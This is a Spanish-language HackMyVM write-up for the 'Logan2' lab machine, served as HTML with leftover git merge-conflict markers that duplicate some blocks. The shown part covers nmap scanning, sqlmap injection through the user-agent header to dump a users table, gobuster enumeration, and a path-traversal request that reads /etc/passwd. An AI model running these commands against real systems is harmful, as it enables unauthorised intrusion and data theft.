<!DOCTYPE html>
<html lang="es"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">HackMyVM - Logan2 | noname</title>
<meta property="og:title" content="HackMyVM - Logan2 | noname" />
<meta name="twitter:title" content="HackMyVM - Logan2 | noname" />
<meta itemprop="name" content="HackMyVM - Logan2 | noname" />
<meta name="application-name" content="HackMyVM - Logan2 | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="Writeup Logan2 🟡">
<meta itemprop="description" content="Writeup Logan2 🟡" />
<meta property="og:description" content="Writeup Logan2 🟡" />
<meta name="twitter:description" content="Writeup Logan2 🟡" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />

<<<<<<< HEAD
  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/hmv/logan2/" title="" />

=======
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a


  <meta itemprop="image" content="https://0x-noname.github.io/machines/hmv/logan2/logan2_logo.webp" />
  <meta property="og:image" content="https://0x-noname.github.io/machines/hmv/logan2/logan2_logo.webp" />
  <meta name="twitter:image" content="https://0x-noname.github.io/machines/hmv/logan2/logan2_logo.webp" />
  <meta name="twitter:image:src" content="https://0x-noname.github.io/machines/hmv/logan2/logan2_logo.webp" />




    
    
    
<<<<<<< HEAD
=======
    
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2023-10-12T18:09:35&#43;0200 />
    <meta property="article:published_time" content=2023-10-12T18:09:35&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "HackMyVM - Logan2",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2023-10-12",
        "description": "Writeup Logan2 🟡",
        "wordCount":  1549 ,
        "mainEntityOfPage": "True",
        "dateModified": "2023-10-12",
        "image": {
        "@type": "imageObject",
        "url": "\/machines\/hmv\/logan2\/logan2_logo.webp"
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>



<<<<<<< HEAD
<meta name="generator" content="Hugo 0.125.7">
=======
<meta name="generator" content="Hugo 0.111.3">
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a

    

    <link rel="canonical" href="https://0x-noname.github.io/writeups/hmv/logan2/">
<<<<<<< HEAD
    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
=======
    <link href="/style.min.0dafdc75467b093a9691e40fa17265d2fe1f3baba37da4faf9af6a1b0b035248.css" rel="stylesheet">
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
<<<<<<< HEAD
    
  

</head>
<body data-theme = "" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

=======
    </head>
<body data-theme = "" class="notransition">
<script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="https://0x-noname.github.io/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<<<<<<< HEAD
<title></title>
=======
<title>Home</title>
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
<<<<<<< HEAD
                
                
=======
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">HackMyVM - Logan2</h1>
                
<<<<<<< HEAD
                
                <div class="post-meta">
                    <time datetime="2023-10-12T18:09:35&#43;02:00" itemprop="datePublished"> Oct 12, 2023 </time>
                </div>
                
            </header>
            
            <div class="page-content">
=======
                <div class="post-meta">
                    <time datetime="2023-10-12T18:09:35&#43;02:00" itemprop="datePublished"> Oct 12, 2023 </time>
                </div>
            </header><div class="page-content">
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
                <p><img src="/../machines/hmv/logan2/logan2_logo.webp" alt="logo"></p>
<ul>
<li><em>SQL-Injection/Time-Based Blind</em></li>
<li><em>LFI to RCE/Log-Poisoning</em></li>
<li><em>CVE-2020-14144 - GiTea authenticated RCE</em></li>
<li><em>Interactive Console - Privesc</em></li>
<li><em>SSTI - Privesc</em></li>
</ul>
<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
<<<<<<< HEAD
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -n -v 192.168.1.140
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp   open  ssh
</span></span><span class="line"><span class="cl">80/tcp   open  http
</span></span><span class="line"><span class="cl">3000/tcp open  ppp
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sVC -v -p 22,80,3000 192.168.1.140
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   256 10:ed:dd:ab:26:fd:f4:9f:28:1e:89:93:f4:58:16:ab (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 43:3b:d9:8c:12:44:e9:92:be:cf:1a:78:fd:33:38:67 (ED25519)
</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
</span></span><span class="line"><span class="cl">|_http-title: Logan
</span></span><span class="line"><span class="cl">| http-methods: 
</span></span><span class="line"><span class="cl">|_  Supported Methods: OPTIONS HEAD GET POST
</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.57 (Debian)
</span></span><span class="line"><span class="cl">3000/tcp open  ppp?
</span></span><span class="line"><span class="cl">| fingerprint-strings: 
</span></span><span class="line"><span class="cl">|   GenericLines, Help: 
</span></span><span class="line"><span class="cl">|     HTTP/1.1 400 Bad Request
</span></span><span class="line"><span class="cl">|     Content-Type: text/plain; charset=utf-8
</span></span><span class="line"><span class="cl">|     Connection: close
</span></span><span class="line"><span class="cl">|     Request
</span></span><span class="line"><span class="cl">|   GetRequest: 
</span></span><span class="line"><span class="cl">|     HTTP/1.0 200 OK
</span></span><span class="line"><span class="cl">|     Content-Type: text/html; charset=UTF-8
</span></span><span class="line"><span class="cl">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
</span></span><span class="line"><span class="cl">|     Set-Cookie: i_like_gitea=d90db38527a80575; Path=/; HttpOnly
</span></span><span class="line"><span class="cl">|     Set-Cookie: _csrf=R3etPCL9Ft-DUQSbuF14N29pU086MTY5NjMyMjMxNTU4NDYwOTUwMg; Path=/; Expires=Wed, 04 Oct 2023 08:38:35 GMT; HttpOnly
</span></span><span class="line"><span class="cl">|     X-Frame-Options: SAMEORIGIN
</span></span><span class="line"><span class="cl">|     Date: Tue, 03 Oct 2023 08:38:35 GMT
</span></span><span class="line"><span class="cl">|     &lt;!DOCTYPE html&gt;
</span></span><span class="line"><span class="cl">|     &lt;html lang=&#34;en-US&#34; class=&#34;theme-&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;head data-suburl=&#34;&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;meta http-equiv=&#34;x-ua-compatible&#34; content=&#34;ie=edge&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;
</span></span><span class="line"><span class="cl">|     &lt;link rel=&#34;manifest&#34; href=&#34;/manifest.json&#34; crossorigin=&#34;use-credentials&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;meta name=&#34;theme-color&#34; content=&#34;#6cc644&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;meta name=&#34;author&#34; content=&#34;Gitea - Git with a cup of tea&#34; /&gt;
</span></span><span class="line"><span class="cl">|     &lt;meta name=&#34;description&#34; content=&#34;Gitea (Git with a cup of tea) is a painless
</span></span><span class="line"><span class="cl">|   HTTPOptions: 
</span></span><span class="line"><span class="cl">|     HTTP/1.0 404 Not Found
</span></span><span class="line"><span class="cl">|     Content-Type: text/html; charset=UTF-8
</span></span><span class="line"><span class="cl">|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
</span></span><span class="line"><span class="cl">|     Set-Cookie: i_like_gitea=6ce0d8ae92e01053; Path=/; HttpOnly
</span></span><span class="line"><span class="cl">|     Set-Cookie: _csrf=ztc_N8-Jh9djSWXZygd69P_ONF86MTY5NjMyMjMyMDYwNjY1NDg5OA; Path=/; Expires=Wed, 04 Oct 2023 08:38:40 GMT; HttpOnly
</span></span><span class="line"><span class="cl">|     X-Frame-Options: SAMEORIGIN
</span></span><span class="line"><span class="cl">|     Date: Tue, 03 Oct 2023 08:38:40 GMT
</span></span><span class="line"><span class="cl">|     &lt;!DOCTYPE html&gt;
</span></span><span class="line"><span class="cl">|     &lt;html lang=&#34;en-US&#34; class=&#34;theme-&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;head data-suburl=&#34;&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;meta http-equiv=&#34;x-ua-compatible&#34; content=&#34;ie=edge&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;
</span></span><span class="line"><span class="cl">|     &lt;link rel=&#34;manifest&#34; href=&#34;/manifest.json&#34; crossorigin=&#34;use-credentials&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;meta name=&#34;theme-color&#34; content=&#34;#6cc644&#34;&gt;
</span></span><span class="line"><span class="cl">|     &lt;meta name=&#34;author&#34; content=&#34;Gitea - Git with a cup of tea&#34; /&gt;
</span></span><span class="line"><span class="cl">|_    &lt;meta name=&#34;description&#34; content=&#34;Gitea (Git with a c
=======
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -p- -T5 -n -v 192.168.1.140
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp   open  ssh
</span></span><span style="display:flex;"><span>80/tcp   open  http
</span></span><span style="display:flex;"><span>3000/tcp open  ppp
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>❯ nmap -sVC -v -p 22,80,3000 192.168.1.140
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   256 10:ed:dd:ab:26:fd:f4:9f:28:1e:89:93:f4:58:16:ab (ECDSA)
</span></span><span style="display:flex;"><span>|_  256 43:3b:d9:8c:12:44:e9:92:be:cf:1a:78:fd:33:38:67 (ED25519)
</span></span><span style="display:flex;"><span>80/tcp   open  http    Apache httpd 2.4.57 ((Debian))
</span></span><span style="display:flex;"><span>|_http-title: Logan
</span></span><span style="display:flex;"><span>| http-methods: 
</span></span><span style="display:flex;"><span>|_  Supported Methods: OPTIONS HEAD GET POST
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.57 (Debian)
</span></span><span style="display:flex;"><span>3000/tcp open  ppp?
</span></span><span style="display:flex;"><span>| fingerprint-strings: 
</span></span><span style="display:flex;"><span>|   GenericLines, Help: 
</span></span><span style="display:flex;"><span>|     HTTP/1.1 400 Bad Request
</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset=utf-8
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>|     Request
</span></span><span style="display:flex;"><span>|   GetRequest: 
</span></span><span style="display:flex;"><span>|     HTTP/1.0 200 OK
</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset=UTF-8
</span></span><span style="display:flex;"><span>|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
</span></span><span style="display:flex;"><span>|     Set-Cookie: i_like_gitea=d90db38527a80575; Path=/; HttpOnly
</span></span><span style="display:flex;"><span>|     Set-Cookie: _csrf=R3etPCL9Ft-DUQSbuF14N29pU086MTY5NjMyMjMxNTU4NDYwOTUwMg; Path=/; Expires=Wed, 04 Oct 2023 08:38:35 GMT; HttpOnly
</span></span><span style="display:flex;"><span>|     X-Frame-Options: SAMEORIGIN
</span></span><span style="display:flex;"><span>|     Date: Tue, 03 Oct 2023 08:38:35 GMT
</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html&gt;
</span></span><span style="display:flex;"><span>|     &lt;html lang=&#34;en-US&#34; class=&#34;theme-&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;head data-suburl=&#34;&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta http-equiv=&#34;x-ua-compatible&#34; content=&#34;ie=edge&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt; Gitea: Git with a cup of tea &lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;link rel=&#34;manifest&#34; href=&#34;/manifest.json&#34; crossorigin=&#34;use-credentials&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta name=&#34;theme-color&#34; content=&#34;#6cc644&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta name=&#34;author&#34; content=&#34;Gitea - Git with a cup of tea&#34; /&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta name=&#34;description&#34; content=&#34;Gitea (Git with a cup of tea) is a painless
</span></span><span style="display:flex;"><span>|   HTTPOptions: 
</span></span><span style="display:flex;"><span>|     HTTP/1.0 404 Not Found
</span></span><span style="display:flex;"><span>|     Content-Type: text/html; charset=UTF-8
</span></span><span style="display:flex;"><span>|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
</span></span><span style="display:flex;"><span>|     Set-Cookie: i_like_gitea=6ce0d8ae92e01053; Path=/; HttpOnly
</span></span><span style="display:flex;"><span>|     Set-Cookie: _csrf=ztc_N8-Jh9djSWXZygd69P_ONF86MTY5NjMyMjMyMDYwNjY1NDg5OA; Path=/; Expires=Wed, 04 Oct 2023 08:38:40 GMT; HttpOnly
</span></span><span style="display:flex;"><span>|     X-Frame-Options: SAMEORIGIN
</span></span><span style="display:flex;"><span>|     Date: Tue, 03 Oct 2023 08:38:40 GMT
</span></span><span style="display:flex;"><span>|     &lt;!DOCTYPE html&gt;
</span></span><span style="display:flex;"><span>|     &lt;html lang=&#34;en-US&#34; class=&#34;theme-&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;head data-suburl=&#34;&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta charset=&#34;utf-8&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta http-equiv=&#34;x-ua-compatible&#34; content=&#34;ie=edge&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;title&gt;Page Not Found - Gitea: Git with a cup of tea &lt;/title&gt;
</span></span><span style="display:flex;"><span>|     &lt;link rel=&#34;manifest&#34; href=&#34;/manifest.json&#34; crossorigin=&#34;use-credentials&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta name=&#34;theme-color&#34; content=&#34;#6cc644&#34;&gt;
</span></span><span style="display:flex;"><span>|     &lt;meta name=&#34;author&#34; content=&#34;Gitea - Git with a cup of tea&#34; /&gt;
</span></span><span style="display:flex;"><span>|_    &lt;meta name=&#34;description&#34; content=&#34;Gitea (Git with a c
>>>>>>> 46cb8663e5d7251ab6d38acc51f0163b1c06378a
</span></span></code></pre></div><h3 id="http-tcp---80">HTTP TCP - 80</h3>
<p><img src="/../machines/hmv/logan2/http.webp" alt="http"></p>
<p>En el código fuente de <code>script.js</code> veo que usa el archivo <code>save-user-agent.php</code>.</p>
<p><img src="/../machines/hmv/logan2/scriptjs.webp" alt="scriptjs"></p>
<p>Al interceptar la petición con <strong>burpsuite</strong> veo que manda la cabecera del <code>user-agent</code> al archivo <code>save-user-agent.php</code>.</p>
<p><img src="/../machines/hmv/logan2/burp.webp" alt="burp"></p>
<p>Guardo la captura con <code>copy to file</code> para usarlo con sqlmap.</p>
<<<<<<< HEAD
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ sqlmap -r agent --level 5 --risk 3 --dbs --batch
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">available databases [2]:
</span></span><span class="line"><span class="cl">[*] information_schema
</span></span><span class="line"><span class="cl">[*] logan
</span></span></code></pre></div><p>Buscando las tablas de <strong>logan</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ sqlmap -r agent --level 5 --risk 3 -D logan --tables
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Database: logan
</span></span><span class="line"><span class="cl">[3 tables]
</span></span><span class="line"><span class="cl">+----------+
</span></span><span class="line"><span class="cl">| browser  |
</span></span><span class="line"><span class="cl">| comments |
</span></span><span class="line"><span class="cl">| users    |
</span></span><span class="line"><span class="cl">+----------+
</span></span></code></pre></div><p>Dumpeo de la tabla <strong>users</strong> y encuentro el subdominio <code>newsitelogan.logan.hmv</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ sqlmap -r agent --level 5 --risk 3 -T users --dump
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Database: logan
</span></span><span class="line"><span class="cl">Table: users
</span></span><span class="line"><span class="cl">[1 entry]
</span></span><span class="line"><span class="cl">+------------------------------+--------+
</span></span><span class="line"><span class="cl">| email                        | user   |
</span></span><span class="line"><span class="cl">+------------------------------+--------+
</span></span><span class="line"><span class="cl">| logan@newsitelogan.logan.hmv | logan  |
</span></span><span class="line"><span class="cl">+------------------------------+--------+
</span></span></code></pre></div><p>Añado el nuevo subdominio a mi archivo hosts y seguidamente lo visito con el navegador.</p>
<p><img src="/../machines/hmv/logan2/subdomain.webp" alt="subdomain"></p>
<p>Fuerza bruta de extensiones.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ gobuster dir -u http://newsitelogan.logan.hmv/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,txt
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Gobuster v3.6
</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">[+] Url:                     http://newsitelogan.logan.hmv/
</span></span><span class="line"><span class="cl">[+] Method:                  GET
</span></span><span class="line"><span class="cl">[+] Threads:                 10
</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt
</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.6
</span></span><span class="line"><span class="cl">[+] Extensions:              php
</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration mode
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">/comments.php         (Status: 500) [Size: 0]
</span></span><span class="line"><span class="cl">/config.php           (Status: 200) [Size: 0]
</span></span><span class="line"><span class="cl">/images               (Status: 301) [Size: 333] [--&gt; http://newsitelogan.logan.hmv/images/]
</span></span><span class="line"><span class="cl">/index.php            (Status: 200) [Size: 51045]
</span></span><span class="line"><span class="cl">/javascript           (Status: 301) [Size: 337] [--&gt; http://newsitelogan.logan.hmv/javascript/]
</span></span><span class="line"><span class="cl">/server-status        (Status: 403) [Size: 287]
</span></span></code></pre></div><p>En el código fuente veo en un comentario el archivo <code>photos-website-logan.php</code> que parece que es el encargado de cargar imágenes.</p>
<p><img src="/../machines/hmv/logan2/sourcecode.webp" alt="sourcecode"></p>
<p>Realizando enumeración básica encuentro un LFI.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl &#39;http://newsitelogan.logan.hmv/photos-website-logan.php?photo=../../../../../etc/passwd&#39;
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span class="line"><span class="cl">games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">avahi-autoipd:x:101:108:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">logan:x:1000:1000:logan,,,:/home/logan:/bin/bash
</span></span><span class="line"><span class="cl">sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
</span></span><span class="line"><span class="cl">mysql:x:103:112:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span class="line"><span class="cl">git:x:104:113:Git Version Control,,,:/home/git:/bin/bash
</span></span><span class="line"><span class="cl">kevin:x:1001:1001:kevin,,,:/home/kevin:/bin/bash
</span></span></code></pre></div><p>Con wfuzz realizo fuerza bruta para encontrar archivos que pueda leer.</p>
